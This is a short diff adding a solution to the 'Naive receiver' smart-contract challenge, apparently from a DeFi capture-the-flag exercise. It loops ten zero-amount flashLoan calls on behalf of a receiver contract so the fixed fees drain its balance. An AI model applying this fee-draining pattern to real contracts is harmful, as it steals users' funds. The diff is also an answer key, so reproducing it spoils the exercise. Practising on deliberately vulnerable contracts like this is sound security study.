@@ -31,6 +31,14 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+
+        // Naive: attacker can drain the user's balance by creating 10 flashloans for 0, all with 1 ether fee.
+        // This is a very naive attack, and it is possible to create a lot of flashloans with a single transaction.
+
+        for(let i = 0; i < 10; i++) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+        };
     });
 
     after(async function () {
